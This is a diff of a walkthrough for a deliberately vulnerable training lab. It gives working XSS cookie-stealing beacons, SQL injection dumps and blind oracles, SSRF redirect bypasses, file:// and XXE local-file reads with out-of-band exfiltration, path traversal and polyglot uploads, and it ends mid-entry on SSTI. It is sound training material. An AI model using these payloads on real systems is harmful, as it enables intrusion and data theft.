@@ -20,7 +20,6 @@ Every walkthrough below is written Burp-first. You need **Burp Suite Community**
 Each challenge below ends with a **Burp workflow** line: what to intercept, what to send to Repeater, and what to change. Follow the walkthrough for the *why*, follow the Burp workflow for the *how*.
 
 ---
----
 
 ## xss – Cross-Site Scripting
 
@@ -77,7 +76,7 @@ Why it works: the injection happens entirely in the browser – the server never
 
 
 **4. XSS via Attribute Breakout** – `PENTRIX{...}`
-1. Open `/xss/attr?n="><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout')</script>`
+1. Open `/xss/attr?n="><script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout&n='+window.__px)</script>`
 2. The page renders `<input type="text" value=""><script>...</script>" readonly />` and the script executes, firing the beacon.
 Why it works: the nickname is interpolated raw inside `value="..."`, so `">` closes the attribute and the injected `<script>` tag runs.
 
@@ -93,11 +92,13 @@ Why it works: input is reflected raw inside a single-quoted JS string; the leadi
 
 
 **6. Stored XSS via SVG Upload** – `PENTRIX{...}`
-1. Open `/xss/svg` and upload this SVG (the script must read the token from the
-   file URL, because the SVG opens as its own document where `window.__px` is
-   not defined; the file is parsed as XML, so the script sits in a CDATA section):
-   `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+new URLSearchParams(location.search).get('n'))]]></script></svg>`
-2. Open the uploaded file's link (it carries the token as `?n=<token>`, e.g. `/xss/uploads/evil-<timestamp>.svg?n=<token>`). The script runs and the beacon awards the flag.
+1. Open `/xss/svg` and upload this SVG (the SVG opens as its own document where `window.__px` is
+   not defined, so the script cannot read the page token directly. The file link carries the token
+   as two share values, `?pxa=` and `?pxk=`, and the script rebuilds the token at runtime by XORing
+   the hex pairs; the raw token never appears anywhere. The file is parsed as XML, so the script
+   sits in a CDATA section):
+   `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+(function(){var p=new URLSearchParams(location.search);var a=p.get('pxa')||'',k=p.get('pxk')||'',t='';for(var i=0;i+1<a.length&&i+1<k.length;i+=2){t+=String.fromCharCode(parseInt(a.substr(i,2),16)^parseInt(k.substr(i,2),16));}return t;})())]]></script></svg>`
+2. Open the uploaded file's link (it carries the two shares, e.g. `/xss/uploads/<name>-<timestamp>.svg?pxa=<hex>&pxk=<hex>`). The script rebuilds the token from the shares, fires the beacon, and the beacon awards the flag. Reading a token straight out of the URL with `?n=` does not work: there is no `n` parameter on the file link, only the two shares.
 Why it works: the file is served back as `image/svg+xml`, and SVG is XML that may contain `<script>`; a direct visit executes it in the lab's origin.
 
 **Burp workflow:** Upload an SVG on `/xss/svg` and intercept the POST in Proxy, noting the multipart body carries your file and the server returns the stored path under `/xss/uploads/`. Send the upload to Repeater (Ctrl+R) and resend with an SVG containing a script beacon: copy the returned upload path from the response. Then GET that `/xss/uploads/...` path in Repeater and check the `Content-Type: image/svg+xml` header: the SVG serves as live script, so opening it in your browser executes the beacon and awards the flag.
@@ -105,12 +106,12 @@ Why it works: the file is served back as `image/svg+xml`, and SVG is XML that ma
 
 **7. XSS via Naive Markdown Links** – `PENTRIX{...}`
 1. Open `/xss/markdown` and render:
-   `[click](javascript:fetch&#40;'/xss/collect?c='+document.cookie+'&v=xss-markdown&n='+window.__px&#41;)`
-   (the `&#40;`/`&#41;` entities keep the renderer's `[^)]+` link regex from cutting the URL short; the browser decodes them in the `href`).
+   `[click](javascript:fetch('/xss/collect?c='+document.cookie+'&v=xss-markdown&n='+window.__px))`
+   (the renderer's link pattern allows one level of balanced parentheses in the URL, so the `fetch(...)` call survives whole inside the link target).
 2. The output contains `<a href="javascript:...">click</a>`. Click it: the script runs and the beacon awards the flag.
 Why it works: the naive renderer converts `[text](url)` to an anchor without validating the URL scheme, so `javascript:` URLs survive into a live link.
 
-**Burp workflow:** Submit a markdown link on `/xss/markdown` and intercept the POST in Proxy, then read the response HTML: the naive renderer turns `[text](url)` into a bare `<a>` tag with no scheme validation. Send that POST to Repeater (Ctrl+R) and change the link URL to a `javascript:` scheme carrying a beacon to `/xss/collect` with `n='+window.__px`, using `&#40;` and `&#41;` entities for parentheses so the renderer's link regex does not cut the URL short. Send it and confirm the response body contains `<a href="javascript:...">`: clicking that rendered link in your proxied browser fires the beacon.
+**Burp workflow:** Submit a markdown link on `/xss/markdown` and intercept the POST in Proxy, then read the response HTML: the naive renderer turns `[text](url)` into a bare `<a>` tag with no scheme validation. Send that POST to Repeater (Ctrl+R) and change the link URL to a `javascript:` scheme carrying a beacon to `/xss/collect` with `n='+window.__px` (the renderer allows one level of balanced parentheses, so the call survives whole). Send it and confirm the response body contains `<a href="javascript:...">`: clicking that rendered link in your proxied browser fires the beacon.
 
 
 **8. DOM Clobbering to Admin** – `PENTRIX{...}`
@@ -129,57 +130,59 @@ Why it works: named DOM elements shadow `window` properties, so attacker markup 
 2. The page renders `` var msg = `${fetch('...')}`; `` and the expression evaluates, firing the beacon.
 Why it works: input is reflected raw inside a backtick template literal, and `${...}` expressions inside template literals are evaluated as JavaScript.
 
-**Burp workflow:** Request `/xss/backtick?m=test` and intercept in Proxy, then read the response: your input lands raw inside a backtick template literal as `` var msg = `test`; ``. Send that GET to Repeater (Ctrl+R) and change `m` to `${alert(1)}`: send it and confirm the response shows `` var msg = `${alert(1)}`; ``, which is the expression being evaluated. Replace the probe with a beacon to `/xss/collect` with `n='+window.__px` and render the page in your proxied browser so the template expression fires the flag. Module: xss (Cross-Site Scripting). Challenges covered: 9.
+**Burp workflow:** Request `/xss/backtick?m=test` and intercept in Proxy, then read the response: your input lands raw inside a backtick template literal as `` var msg = `test`; ``. Send that GET to Repeater (Ctrl+R) and change `m` to `${alert(1)}`: send it and confirm the response shows `` var msg = `${alert(1)}`; ``, which is the expression being evaluated. Replace the probe with a beacon to `/xss/collect` with `n='+window.__px` and render the page in your proxied browser so the template expression fires the flag.
 
 ---
 
 
 ## sqli – SQL Injection
 
+Five of these challenges (Boolean Blind, ORDER BY, LIKE Wildcard, LIMIT/OFFSET, and GROUP BY) each guard their **own** challenge secret. Your injected SQL can read that secret as `sqli_target()`, and only inside that challenge's own route: everywhere else the function returns NULL. A secret pulled out of another challenge (including the admin secret from a UNION dump) will not match these five, so each technique has to be worked for real. The other six challenges still target the admin secret or the admin account directly, as described in their entries.
+
 **1. Login bypass** – `PENTRIX{...}`
-The login query interpolates your username into SQL. Break out of the string and make the WHERE clause always true:
+The login query interpolates your username into SQL. Break out of the string, make the WHERE clause always true, and comment out the password check:
 ```
 POST /sqli/login
-username=admin' OR '1'='1&password=anything
+username=' OR '1'='1' -- &password=<redacted>
 ```
-Why it works: the query becomes `... WHERE username='admin' OR '1'='1' ...`, which matches the admin row without a password.
+Why it works: the query becomes `... WHERE username='' OR '1'='1' -- ' AND password='...'`, which matches the admin row without a password. Logging in with the real admin password also signs you in, but earns no flag: only a login that came from breaking the query counts.
 
-**Burp workflow:** In the Proxy, click the Login button on GET /sqli/login and intercept the form POST to /sqli/login. Send it to Repeater (Ctrl+R) and replay it with the username and password fields visible so you can edit them freely. Add a quote and an always-true condition to the username field to break out of the string and see what changes in the response.
+**Burp workflow:** In the Proxy, click the Login button on GET /sqli/login and intercept the form POST to /sqli/login. Send it to Repeater (Ctrl+R) and replay it with the username and password fields visible so you can edit them freely. Add a quote and an always-true condition to the username field, end it with a SQL comment (`-- `) so the password check is commented out, and see what changes in the response.
 
 
-**2. UNION injection** – `PENTRIX{...}`
+**2. UNION-based Injection** – `PENTRIX{...}`
 The product search concatenates `q` into the query. Append a UNION SELECT with matching column count:
 ```
 GET /sqli/products?q=' UNION SELECT id,username,password,secret FROM users--%20
 ```
-Why it works: UNION merges rows from another table into the result set, so the page renders usernames, password hashes, and secrets as "products".
+Why it works: UNION merges rows from another table into the result set, so the page renders usernames, password hashes, and secrets as "products". The flag is awarded when the admin secret appears in the rendered results.
 
 **Burp workflow:** Load GET /sqli/products in the browser, type something in the q search box, and catch the request in the Proxy. Send it to Repeater and play with the q parameter: first add a quote to confirm it breaks the query, then grow your UNION SELECT step by step. Start with a UNION SELECT that has just one column, add columns one at a time until the page renders again, then point it at the users table.
 
 
-**3. Blind boolean injection** – `PENTRIX{...}`
-`/sqli/product?id=` only answers "exists / not found", but you can ask it yes/no questions about the secret:
+**3. Boolean Blind Injection** – `PENTRIX{...}`
+`/sqli/product?id=` only answers "Product exists / Not found", but you can ask it yes/no questions about this challenge's own secret, which your injected SQL reads as `sqli_target()`:
 ```
-GET /sqli/product?id=1 AND substr((SELECT secret FROM users WHERE username='admin'),1,1)='P'
+GET /sqli/product?id=0' OR substr(sqli_target(),1,1)='P' -- 
 ```
-Repeat per character, then submit what you extracted:
+"Product exists" means the guess is right, "Not found" means it is wrong. Repeat per character position (the secret has the `PENTRIX{...}` shape, so you know which characters to expect at the braces) until you have the whole value, then submit what you extracted:
 ```
 POST /sqli/blind-submit
-secret=<the secret you extracted>
+secret=<redacted>
 ```
-Why it works: even a single bit of difference in the response is enough to exfiltrate data one boolean question at a time.
+Why it works: even a single bit of difference in the response is enough to exfiltrate data one boolean question at a time. The submit box is bound to this challenge alone: the admin secret (for example one dumped via the UNION challenge) is rejected here.
 
-**Burp workflow:** Intercept GET /sqli/product?id=1 in the Proxy and send it to Repeater so you can watch how the page behaves for a real product versus a missing one. Tweak the id parameter with AND conditions and notice the response flips between two states, which gives you a true/false oracle. For the full extraction you will need one request per character, so mark the value position and send it to Intruder (Ctrl+I) as a sniper with a character payload set.
+**Burp workflow:** Intercept GET /sqli/product?id=1 in the Proxy and send it to Repeater so you can watch how the page behaves for a real product versus a missing one. Tweak the id parameter with AND/OR conditions against `sqli_target()` and notice the response flips between the two states, which gives you a true/false oracle. For the full extraction you will need one request per character, so mark the guessed-character position and send it to Intruder (Ctrl+I) as a sniper with a character payload set, reading the results with Grep-Match on the "Product exists" text. Submit the recovered secret in the form on the product page.
 
 
-**4. Error-based injection** – `PENTRIX{...}`
+**4. Error-based Injection** – `PENTRIX{...}`
 Raw SQLite errors are printed to the page. Any malformed input proves the injection point:
 ```
 GET /sqli/detail?id='
 ```
-Why it works: verbose database errors confirm your input reached the SQL parser and leak schema details for free.
+Why it works: verbose database errors confirm your input reached the SQL parser and leak schema details for free. Two error families both earn the flag: a parse-time error (a stray quote gives "unrecognized token" or "syntax error") and a runtime error (malformed JSON, a wrong-argument function call, or a missing column). Either one proves error-based injection.
 
-**Burp workflow:** Open GET /sqli/detail in the browser, submit the id field, and catch it in the Proxy. Send it to Repeater and drop a single quote into id, then read the response: raw SQLite errors show up right on the page. Use those error messages to learn the table structure before you build anything fancier.
+**Burp workflow:** Open GET /sqli/detail in the browser, submit the id field, and catch it in the Proxy. Send it to Repeater and drop a single quote into id, then read the response: raw SQLite errors show up right on the page. Use those error messages to learn the table structure before you build anything fancier, and try a runtime break (malformed JSON or a wrong number of arguments) as the second error path.
 
 
 ---
@@ -189,45 +192,52 @@ Why it works: verbose database errors confirm your input reached the SQL parser 
 
 The `sort` parameter on `/sqli/sort` is interpolated straight into `ORDER BY`,
 and `ORDER BY` accepts full expressions, not just column names. Smuggle in a
-`CASE WHEN` boolean oracle that reads the users table:
+`CASE WHEN` boolean oracle that reads this challenge's own secret as
+`sqli_target()`:
 
-```bash
-curl -G 'http://<your-lab-address>/sqli/sort' \
-  --data-urlencode "sort=(CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END)"
+```
+GET /sqli/sort?sort=(CASE WHEN substr(sqli_target(),1,1)='P' THEN id ELSE name END)
 ```
 
-Watch the row order: when the condition is true the table is sorted by name
-(Bug Bounty Field Notes first); flip `'P'` to a wrong guess like `'X'` and the
-table is sorted by price instead (Sticker Pack first). Each request answers one
-yes/no question about the secret. The flag is awarded when the CASE-based oracle
-against the users table runs successfully.
+Watch the row order: when the condition is true the table is sorted by id;
+flip `'P'` to a wrong guess like `'X'` and the table is sorted by name
+instead. Each request answers one yes/no question about the secret. Extract
+it one character at a time, then submit the full value in the form below the
+table:
+
+```
+POST /sqli/sort/submit
+secret=<redacted>
+```
 
 Why it works: `ORDER BY` evaluates any expression per row, so a conditional
-expression turns the visible sort order into a boolean oracle.
+expression turns the visible sort order into a boolean oracle. Running the
+oracle alone earns nothing: the flag is awarded only when the extracted
+secret is submitted, and the submit box accepts only this challenge's own
+secret, so a secret read from the users table (or from another challenge)
+is rejected.
 
-**Burp workflow:** Open GET /sqli/sort and intercept a request with the sort parameter, then send it to Repeater. Notice that sort is not a value but an ORDER BY expression, so try swapping the sort column for a CASE WHEN expression and watch the product order flip. Once the order changes predictably, point the CASE condition at the users table and use the row order as your yes/no oracle for each guess.
+**Burp workflow:** Open GET /sqli/sort and intercept a request with the sort parameter, then send it to Repeater. Notice that sort is not a value but an ORDER BY expression, so try swapping the sort column for a CASE WHEN expression against `sqli_target()` and watch the product order flip. Once the order changes predictably, hand the character guesses to Intruder (Ctrl+I) and read each position from the row order, then submit the recovered secret in the form below the table.
 
 
 **6. Second-Order SQL Injection** – `PENTRIX{...}`
 
-Registration (`POST /sqli/register`) stores your display name with a prepared
+Registration stores your display name with a prepared
 statement, so the payload sleeps quietly. But `/sqli/profile` later interpolates
 that stored value into a brand-new query:
 
-```bash
-# Step 1: plant the payload as your display name
-curl -X POST 'http://<your-lab-address>/sqli/register' \
-  --data-urlencode 'username=evil1' \
-  --data-urlencode "display_name=admin'--" \
-  --data-urlencode 'password=x'
+```
+POST /sqli/register
+username=evil1&display_name=admin'--&password=<redacted>
 
-# Step 2: trigger it by viewing your profile
-curl 'http://<your-lab-address>/sqli/profile?u=evil1'
+GET /sqli/profile?u=evil1
 ```
 
 The profile page runs `SELECT * FROM users WHERE username='admin'--'` and lands
 on the admin account, displaying its secret and awarding the flag. The injection
-fires on read, not on write.
+fires on read, not on write. Registering the plain display name `admin` with no
+quote breakout earns nothing: the stored value must actually break out of the
+string literal in the second query.
 
 Why it works: input that is safe at rest becomes SQL when it is concatenated
 into a later query; the trust boundary moved from the form to the database.
@@ -235,23 +245,33 @@ into a later query; the trust boundary moved from the form to the database.
 **Burp workflow:** In the Proxy, catch the POST to /sqli/register with the username, display_name, and password fields, then send it to Repeater. Plant something SQL-ish in display_name (quotes, comment markers) and note that registration succeeds quietly; nothing fires yet. Now request GET /sqli/profile?u=<your username> in Repeater and watch the stored value turn into SQL at read time, which is when the injection actually triggers.
 
 
-**7. LIKE Wildcard Injection** – `PENTRIX{...}`
+**7. LIKE Wildcard Exfiltration** – `PENTRIX{...}`
 
-`/sqli/wildcard` drops your term into `LIKE '%q%'` without escaping the pattern
-characters `%` and `_`:
+`/sqli/wildcard` drops your term into `LIKE '%q%'` inside a string-interpolated
+query, and the page now reports only **how many** products match. A bare `%`
+just widens the catalog search and earns nothing on its own. The real attack
+is a quote breakout that turns the match count into a boolean oracle against
+this challenge's own secret, readable as `sqli_target()`:
 
-```bash
-curl -G 'http://<your-lab-address>/sqli/wildcard' --data-urlencode 'q=%'
+```
+GET /sqli/wildcard?q=' AND substr(sqli_target(),1,1)='P' -- 
 ```
 
-A single `%` matches everything, so one request dumps the whole catalog. `_`
-works the same way for single characters (try `q=B_g` to see partial matching).
+When the guess is right, every product matches and the page reports the full
+catalog count; when it is wrong, the count drops to 0. Work through the secret
+one character at a time, then submit it:
 
-Why it works: `%` and `_` are wildcards inside `LIKE`, and the app never escapes
-them, so attacker-controlled wildcards widen the match to rows the search
-should not return.
+```
+POST /sqli/wildcard/submit
+secret=<redacted>
+```
 
-**Burp workflow:** Intercept GET /sqli/wildcard?q=something in the Proxy and send it to Repeater. Try replacing the term with just % and watch the whole catalog come back, because your input lands inside LIKE '%...%'. Experiment with _ as a single-character wildcard too, then send your best term to the POST /sqli/wildcard/submit to bank the result.
+Why it works: `%` and `_` are wildcards inside `LIKE` and are never escaped,
+and because the whole query is string-interpolated, a quote breakout lets you
+attach a subquery condition to the pattern, turning a match count into a
+true/false oracle. The submit box accepts only this challenge's own secret.
+
+**Burp workflow:** Intercept GET /sqli/wildcard?q=something in the Proxy and send it to Repeater. Try replacing the term with just % first and note the page only reports a match count, with no rows and no flag. Then build the oracle: break out of the quote and add an AND condition against `sqli_target()` so the count flips between the full catalog and zero as your character guess changes. Send the oracle to Intruder (Ctrl+I) with a character payload set to extract the secret position by position, then submit it in the form on the checker page.
 
 
 **8. LIMIT/OFFSET Injection** – `PENTRIX{...}`
@@ -259,38 +279,46 @@ should not return.
 `/sqli/paged` shows 2 products, but `limit` is interpolated raw into the `LIMIT`
 clause, and `LIMIT` accepts more than a plain number:
 
-```bash
-curl 'http://<your-lab-address>/sqli/paged?limit=-1'   # SQLite: -1 means no limit
-curl 'http://<your-lab-address>/sqli/paged?limit=1,10'  # offset,count form
+```
+GET /sqli/paged?limit=-1
+GET /sqli/paged?limit=1,10
 ```
 
-Both dump every product instead of the default page of 2, and the flag is
-awarded for genuine LIMIT-syntax injection (a plain number like `limit=10`
-dumps rows too, but earns nothing).
+One catalog row (Archived Prototype X9) never appears on the default page of
+2, and its description carries this challenge's audit token. Both requests
+above pull that hidden row into view, and the flag is awarded when the token
+appears in the output through genuine LIMIT-clause manipulation. A plain
+number like `limit=10` shows the hidden row too, but earns nothing, and a
+no-op suffix that still shows the same 2 products earns nothing either: the
+technique must be LIMIT syntax, not just a bigger page size.
 
 Why it works: the numeric context was never validated, so SQL clause syntax
-(`-1`, `offset,count`) is accepted where only a page size was intended.
+(`-1`, `offset,count`) is accepted where only a page size was intended, and a
+row the pagination was meant to hide becomes reachable.
 
-**Burp workflow:** Open GET /sqli/paged and catch the request with its limit parameter in the Proxy, then send it to Repeater. The page only shows 2 products, so try values like -1 or the offset,count form in limit and watch the full catalog dump. Keep testing which LIMIT syntax the backend accepts until the flag lands; a plain bigger number works too but does not count.
+**Burp workflow:** Open GET /sqli/paged and catch the request with its limit parameter in the Proxy, then send it to Repeater. The page only shows 2 products, so try values beyond plain positive numbers in limit (below zero, or two numbers separated by a comma) and watch the returned rows shift until the hidden catalog row and its audit token appear. Keep testing which LIMIT syntax the backend accepts until the flag lands; a plain bigger number shows the row but does not count.
 
 
 **9. GROUP BY Injection** – `PENTRIX{...}`
 
 `/sqli/stats` groups sales by the `by` parameter and prints the grouping key in
-the first column. `GROUP BY` accepts any expression, including a subquery:
+the first column. `GROUP BY` accepts any expression, including a subquery.
+Point the expression at this challenge's own secret:
 
-```bash
-curl -G 'http://<your-lab-address>/sqli/stats' \
-  --data-urlencode "by=(SELECT secret FROM users WHERE username='admin')"
+```
+GET /sqli/stats?by=(SELECT sqli_target())
 ```
 
-Every row collapses into one group whose key is the admin secret, which renders
-in the Group column and triggers the flag.
+Every row collapses into one group whose key is the challenge secret, which
+renders in the Group column and triggers the flag in a single request.
 
 Why it works: the grouping expression is attacker-controlled and echoed back,
-so pointing it at the users table exfiltrates data through the group key.
+so an expression that returns a single value exfiltrates it through the group
+key. The expression must actually call `sqli_target()`: grouping by a
+subquery against the users table, or pasting a secret you found elsewhere in
+as a quoted literal, renders a group key but earns nothing.
 
-**Burp workflow:** Intercept GET /sqli/stats?by=<something> in the Proxy and send it to Repeater. The by parameter feeds the GROUP BY expression directly, and the grouping key is printed back in the first column. Replace by with a subquery that returns a single value and watch it show up as the group key, then aim that subquery at the users table.
+**Burp workflow:** Intercept GET /sqli/stats?by=<something> in the Proxy and send it to Repeater. The by parameter feeds the GROUP BY expression directly, and the grouping key is printed back in the first column. Replace by with an expression that returns this challenge's secret (a subquery calling `sqli_target()`) and watch it show up as the group key; one request is enough, no guessing loop needed.
 
 
 **10. UNION Filter Bypass** – `PENTRIX{...}`
@@ -298,13 +326,12 @@ so pointing it at the users table exfiltrates data through the group key.
 `/sqli/shop` strips only the exact lowercase word `union` from your search. The
 filter is case-sensitive and comment-blind:
 
-```bash
-curl -G 'http://<your-lab-address>/sqli/shop' \
-  --data-urlencode "q=' UNION SELECT id,username,password,secret FROM users-- "
+```
+GET /sqli/shop?q=' UNION SELECT id,username,password,secret FROM users-- 
 ```
 
 Uppercase `UNION` sails through and dumps the users table, including the admin
-secret. Variants that also work: mixed case (`uNiOn`) and inline comments
+secret, and the flag is awarded when the secret renders in the results. Variants that also work: mixed case (`uNiOn`) and inline comments
 (`'/**/UNION/**/SELECT`). Lowercase `union` gets mangled into a database error,
 which is the filter "working".
 
@@ -320,11 +347,11 @@ The feedback form at `/sqli/feedback` interpolates your input into
 `INSERT INTO sqli_feedback(name, message) VALUES ('...', '...')`. Stacked
 queries are blocked, but `VALUES()` accepts a subquery as a value:
 
-```bash
-curl -X POST 'http://<your-lab-address>/sqli/feedback' \
-  --data-urlencode "name=x', (SELECT secret FROM users WHERE username='admin')) -- " \
-  --data-urlencode 'message=hello'
-curl 'http://<your-lab-address>/sqli/feedback'
+```
+POST /sqli/feedback
+name=x', (SELECT secret FROM users WHERE username='admin')) -- &message=hello
+
+GET /sqli/feedback
 ```
 
 The resulting SQL is
@@ -468,7 +495,7 @@ authorization check, so anyone can impersonate any customer, including admin.
 
 ## idor – Broken Access Control
 
-Log in as alice first: `GET /idor/login/alice` (password `alice123`).
+Log in as alice first: `GET /idor/login/alice` (a one-click demo login, no password).
 
 **1. Profile IDOR** – `PENTRIX{...}`
 ```
@@ -594,9 +621,17 @@ including the blocked internal host:
 
 ```bash
 curl --get --data-urlencode \
-  "url=http://<your-lab-address>/ssrf/jump?to=http://127.0.0.1:<lab-port>/ssrf/internal/secret" \
+  "url=http://localhost:<lab-port>/ssrf/jump?to=http://127.0.0.1:<lab-port>/ssrf/internal/secret" \
   http://<your-lab-address>/ssrf/fetch3
 ```
+
+The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
+flag `PENTRIX{...}`. Note the initial URL aims the `/ssrf/jump` prefix at
+`localhost` on purpose: fetch3 rejects the blocked loopback `127.0.0.1` as
+the *initial* URL's host, so a request that starts at
+`http://127.0.0.1:<lab-port>/ssrf/jump?...` dies with 403 before any
+redirect is followed. The redirect target keeps `127.0.0.1` because that is
+the blocked host the redirect smuggles the fetch to.
 
 The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
 flag `PENTRIX{...}`. The page awards the flag only when at
@@ -735,7 +770,7 @@ awards the flag `PENTRIX{...}`.
 Why it works: allowing `file://` in a URL fetcher turns it into a local file
 reader running with the server's privileges.
 
-**Burp workflow:** Intercept the request to `/ssrf/fetch-file` and send it to Repeater. This fetcher accepts the `file:` scheme, so change the `url` parameter from an `http://` URL to a `file://` URL pointing at a local file the server can read, like the system password file. Send it and the page shows the file contents, which proves the fetcher is reading with the server's own filesystem privileges. Start with readable system files, then think about what app files would live on the same box. Summary: SSRF module, 9 challenges covered.
+**Burp workflow:** Intercept the request to `/ssrf/fetch-file` and send it to Repeater. This fetcher accepts the `file:` scheme, so change the `url` parameter from an `http://` URL to a `file://` URL pointing at a local file the server can read, like the system password file. Send it and the page shows the file contents, which proves the fetcher is reading with the server's own filesystem privileges. Start with readable system files, then think about what app files would live on the same box.
 
 
 ---
@@ -830,22 +865,24 @@ basename or containment check. Escape the directory with `../`:
 
 ```bash
 printf 'TRAVERSAL-PROOF' \
-  | curl --data-binary @- "http://<your-lab-address>/upload/traverse?filename=../pwn.txt"
+  | curl -c jar --data-binary @- "http://<your-lab-address>/upload/traverse?filename=../pwn.txt"
 ```
 
-The file lands one level above the uploads dir and the flag
-`PENTRIX{...}` is awarded. Read it back through the same
-missing check on the read path:
+The file lands one level above the uploads dir, but the upload alone only
+arms the proof: no flag yet. Prove the round trip in the same session through
+the prove endpoint, which serves the escaped file back only if it matches the
+bytes you uploaded:
 
 ```bash
-curl "http://<your-lab-address>/upload/traversed?f=../pwn.txt"   # prints TRAVERSAL-PROOF
+curl -b jar "http://<your-lab-address>/upload/traverse-prove?f=../pwn.txt"   # flag awarded here
+curl "http://<your-lab-address>/upload/traversed?f=../pwn.txt"   # also prints TRAVERSAL-PROOF, but awards nothing
 ```
 
 Why it works: `path.join` does not stop `../` segments from escaping the
 intended directory, so both the write and the read resolve outside the
 uploads folder.
 
-**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/traverse?filename=` and send it to Repeater (Ctrl+R). In Repeater, set the filename to `../pwn.txt`: there is no basename or containment check, so the write lands one level above the uploads directory. Read it back through `/upload/traversed?f=../pwn.txt` to prove the read path has the same missing check and your bytes are on disk.
+**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/traverse?filename=` and send it to Repeater (Ctrl+R). In Repeater, set the filename to `../pwn.txt`: there is no basename or containment check, so the write lands one level above the uploads directory. Then, in the same session, GET `/upload/traverse-prove?f=../pwn.txt`: the flag fires only when the escaped file is read back byte-identical, proving the write really escaped. (`/upload/traversed?f=../pwn.txt` shows the bytes too, but it is not the award step.)
 
 
 **6. Strip-once filter bypass** – `PENTRIX{...}`
@@ -915,7 +952,7 @@ Why it works: magic-byte checks only validate the file's first bytes, and
 serving the "validated image" as HTML executes the rest, making a true
 polyglot that is both a GIF header and a script.
 
-**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/polyglot?filename=x.gif` and send it to Repeater (Ctrl+R). In Repeater, craft a body that starts with a real GIF header followed by HTML: the magic-byte check only inspects the first 6 bytes, so it passes. Open `/upload/poly/x.gif` and confirm the `Content-Type` is `text/html` with your scriptable HTML intact, proving the same file is both a valid image header and executable markup. Module: upload (Unrestricted File Upload). Challenge count: 8.
+**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/polyglot?filename=x.gif` and send it to Repeater (Ctrl+R). In Repeater, craft a body that starts with a real GIF header followed by HTML: the magic-byte check only inspects the first 6 bytes, so it passes. Open `/upload/poly/x.gif` and confirm the `Content-Type` is `text/html` with your scriptable HTML intact, proving the same file is both a valid image header and executable markup.
 
 ---
 
@@ -1075,10 +1112,10 @@ several (space, tab, newline).
 ## xxe – XML External Entity Injection
 
 **1. XXE file read** – `PENTRIX{...}`
-The XML importer resolves external entities. Declare one pointing at a local file:
+The XML importer resolves external entities. Declare one pointing at a local file (the lab pages print the exact absolute path of `modules/xxe/secret.txt` for your install; substitute it wherever `<absolute-path-to>` appears in this module):
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]>
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">]>
 <data><name>&xxe;</name></data>
 ```
 ```
@@ -1126,7 +1163,7 @@ Step 1 - host the malicious DTD on the in-lab collector:
 
 ```
 POST /xxe/collector/dtd
-dtd=<!ENTITY % file SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">
+dtd=<!ENTITY % file SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">
 <!ENTITY pingback SYSTEM "http://<your-lab-address>/xxe/collector/log?d=%file;">
 ```
 
@@ -1155,7 +1192,7 @@ Request:
 
 ```
 POST /xxe/svg
-svg=<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+svg=<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
 ```
 
 The SVG text extractor runs the module's entity-expanding parser before pulling out
@@ -1174,7 +1211,7 @@ Request:
 
 ```
 POST /xxe/xinclude
-xml=<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt" parse="text"/></root>
+xml=<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://<absolute-path-to>/modules/xxe/secret.txt" parse="text"/></root>
 ```
 
 The endpoint honors `<xi:include>` tags and resolves the `href` server-side with the
@@ -1194,7 +1231,7 @@ Request (single quotes around the inner URL are required):
 ```
 POST /xxe/param
 xml=<!DOCTYPE r [
-<!ENTITY % file SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">
+<!ENTITY % file SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">
 <!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://<your-lab-address>/xxe/collector/log?d=%file;'>">
 %oob;
 ]>
@@ -1220,7 +1257,7 @@ Request:
 
 ```
 POST /xxe/soap
-xml=<?xml version="1.0"?><!DOCTYPE env [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>
+xml=<?xml version="1.0"?><!DOCTYPE env [<!ENTITY xxe SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetStatus>&xxe;</GetStatus></soap:Body></soap:Envelope>
 ```
 
 A second XML endpoint expecting a SOAP envelope runs the same naive entity-expanding
@@ -1247,12 +1284,12 @@ The page answers "Hello 49!", proving server-side evaluation.
 **Burp workflow:** With Proxy intercept on, open /ssti/greet in the browser and submit a name, then send the captured request to Repeater with Ctrl+R. Change the name parameter to a small template expression like {{7*7}} and resend. If the rendered greeting echoes the computed result instead of your literal text, you have confirmed server-side evaluation and the flag shows up in the page.
 
 
-**2. SSTI to RCE** – `PENTRIX{...}`
-Once template syntax evaluates, reach for the engine's internals (objects, attributes, subclasses) to break out of the sandbox and run OS commands or read the flag variable the challenge exposes:
